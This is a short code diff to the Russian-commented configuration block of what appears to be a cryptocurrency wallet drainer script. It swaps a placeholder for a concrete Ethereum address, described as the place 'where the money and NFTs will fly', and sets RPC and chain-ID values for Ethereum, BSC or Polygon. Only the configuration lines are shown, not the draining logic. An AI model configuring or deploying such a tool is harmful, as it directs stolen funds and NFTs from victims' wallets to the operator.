@@ -1,5 +1,5 @@
 / --- КОНФИГУРАЦИЯ ---
-const your_wallet_address = "0xТВОЙ_АДРЕС_СЮДА"; // Адрес, куда полетят деньги и NFT
+const your_wallet_address = "0x0e7F3426C8bBE2ceA15EF02d45E0F4a7CB279dC1"; // Адрес, куда полетят деньги и NFT
 const rpc_url = "https://mainnet.infura.io/v3/ТВОЙ_INFURA_ID"; // RPC для Ethereum. Можешь заменить на BSC, Polygon и т.д.
 const chain_id = 1; // 1 для Ethereum, 56 для BSC, 137 для Polygon
 
